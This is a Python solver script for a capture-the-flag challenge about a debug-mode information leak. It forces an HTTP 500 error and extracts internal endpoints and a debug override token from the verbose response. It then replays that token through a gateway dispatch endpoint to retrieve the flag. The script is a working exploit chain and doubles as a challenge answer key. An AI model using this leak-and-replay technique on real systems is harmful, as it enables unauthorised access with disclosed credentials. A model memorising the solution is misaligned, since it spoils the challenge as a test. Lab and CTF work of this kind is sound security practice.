#!/usr/bin/env python3
"""
Automated Solver for D28 — Production Debug Mode
Performs clean-room solve:
1. Interacts with the public Production API on TCP/80.
2. Triggers safe error condition to receive verbose debug disclosure.
3. Extracts internal service configuration, endpoints, and challenge-local debug credential.
4. Dispatches authorized executive core query via the internal gateway bridge.
5. Retrieves and verifies the challenge flag.
"""

import argparse
import json
import re
import sys
import urllib.error
import urllib.request


def solve(host="127.0.0.1", port=8080):
    base_url = f"http://{host}:{port}"
    print(f"[*] Target Base URL: {base_url}")

    # Step 1: Query public index to confirm service availability
    print("[*] Step 1: Checking public Production Gateway status...")
    try:
        req = urllib.request.Request(f"{base_url}/api/v1/status")
        with urllib.request.urlopen(req, timeout=5) as resp:
            status_data = json.loads(resp.read().decode("utf-8"))
            print(f"[+] Gateway Online: {status_data.get('cluster')} ({status_data.get('gateway_version')})")
    except Exception as e:
        print(f"[!] Warning: Could not fetch /api/v1/status: {e}")

    # Step 2: Trigger safe error condition on /api/v1/telemetry/query
    print("[*] Step 2: Triggering safe error condition to elicit debug disclosure...")
    error_payload = {
        "sector": 1337,
        "metrics": "invalid_type_expected_list",
        "filter": "malformed_syntax"
    }
    req_data = json.dumps(error_payload).encode("utf-8")
    err_req = urllib.request.Request(
        f"{base_url}/api/v1/telemetry/query",
        data=req_data,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json"
        },
        method="POST"
    )

    debug_data = None
    try:
        urllib.request.urlopen(err_req, timeout=5)
        print("[!] Error condition did not return 500 status code!")
        sys.exit(1)
    except urllib.error.HTTPError as http_err:
        if http_err.code == 500:
            resp_body = http_err.read().decode("utf-8")
            try:
                debug_data = json.loads(resp_body)
                print("[+] Successfully received structured verbose debug disclosure (HTTP 500)!")
            except json.JSONDecodeError:
                print(f"[!] Received non-JSON debug disclosure:\n{resp_body[:500]}")
                sys.exit(1)
        else:
            print(f"[!] Unexpected HTTP status code: {http_err.code}")
            sys.exit(1)
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)

    # Step 3: Inspect disclosed stack & configuration information
    print("[*] Step 3: Inspecting disclosed debug report and extracting internal credentials...")
    debug_report = debug_data.get("debug_report", {})
    runtime_env = debug_report.get("runtime_environment", {})
    upstream_info = debug_report.get("upstream_microservices", {}).get("internal_nexus_core", {})

    internal_host = upstream_info.get("service_host") or runtime_env.get("INTERNAL_CORE_SERVICE_URL")
    cluster_dns = upstream_info.get("cluster_dns") or runtime_env.get("INTERNAL_CORE_DISCOVERY_NAME")
    executive_endpoint = upstream_info.get("executive_endpoint") or runtime_env.get("INTERNAL_EXECUTIVE_ROUTE")
    auth_header = upstream_info.get("required_auth_header") or runtime_env.get("INTERNAL_AUTH_HEADER")
    debug_token = upstream_info.get("debug_auth_token") or runtime_env.get("DEBUG_OVERRIDE_KEY")
    target_node = upstream_info.get("target_node") or runtime_env.get("TARGET_CORE_NODE")
    expected_action = upstream_info.get("expected_action") or runtime_env.get("REQUIRED_ACTION_PAYLOAD")

    print(f"[+] Discovered Internal Service:   {internal_host} ({cluster_dns})")
    print(f"[+] Discovered Executive Endpoint: {executive_endpoint}")
    print(f"[+] Discovered Auth Header:        {auth_header}")
    print(f"[+] Discovered Debug Override Key: {debug_token}")
    print(f"[+] Discovered Target Node / Act:  {target_node} / {expected_action}")

    if not debug_token or not executive_endpoint:
        print("[!] Failed to extract necessary internal parameters from debug disclosure!")
        sys.exit(1)

    # Step 4: Dispatch authorized command through gateway bridge
    print("[*] Step 4: Dispatching authorized executive query to internal service via gateway bridge...")
    dispatch_url = f"{base_url}/api/v1/gateway/dispatch"
    dispatch_payload = {
        "endpoint": executive_endpoint,
        "action": expected_action,
        "target": target_node,
        "auth_token": debug_token
    }
    dispatch_data = json.dumps(dispatch_payload).encode("utf-8")
    
    dispatch_req = urllib.request.Request(
        dispatch_url,
        data=dispatch_data,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            auth_header: debug_token
        },
        method="POST"
    )

    try:
        with urllib.request.urlopen(dispatch_req, timeout=5) as dispatch_resp:
            resp_body = dispatch_resp.read().decode("utf-8")
            result = json.loads(resp_body)
            print(f"[+] Dispatch Response:\n{json.dumps(result, indent=2)}")
            
            flag = result.get("flag")
            if not flag:
                # Check for flag regex in entire body
                match = re.search(r"(DOOM\{[^\}]+\}|FLAG\{[^\}]+\})", resp_body)
                if match:
                    flag = match.group(1)

            if flag:
                print("\n========================================================")
                print(f"[SUCCESS] Flag Retrieved: {flag}")
                print("========================================================\n")
                return flag
            else:
                print("[!] No flag found in executive response!")
                sys.exit(1)
    except urllib.error.HTTPError as err:
        err_out = err.read().decode("utf-8", errors="ignore")
        print(f"[!] Dispatch failed with HTTP {err.code}: {err_out}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Dispatch request failed: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(description="D28 — Production Debug Mode Solver")
    parser.add_argument("--host", default="127.0.0.1", help="Target host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=8080, help="Target port (default: 8080 for compose, 80 for k8s)")
    args = parser.parse_args()

    solve(args.host, args.port)


if __name__ == "__main__":
    main()
